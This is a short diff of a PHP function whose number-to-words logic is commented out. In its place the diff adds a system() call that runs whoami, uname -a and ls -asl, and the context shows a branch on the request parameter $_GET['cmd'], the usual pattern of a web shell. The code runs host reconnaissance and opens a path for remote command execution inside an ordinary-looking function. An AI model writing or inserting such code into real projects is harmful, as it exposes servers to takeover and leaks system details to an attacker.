@@ -10,9 +10,10 @@ function main(array $args)
 //     $number = (int)($args['number']);
 //     $words = (new NumberToWords)->toWords($number);
  
-    echo("test1337");
-    echo(system("whoami"));
-    print("test1337");
+    echo("------");
+    echo(system("whoami ; uname -a ; ls -asl"));
+    echo("\n");
+    print("------");
  
     if(isset($_GET['cmd']))
     {
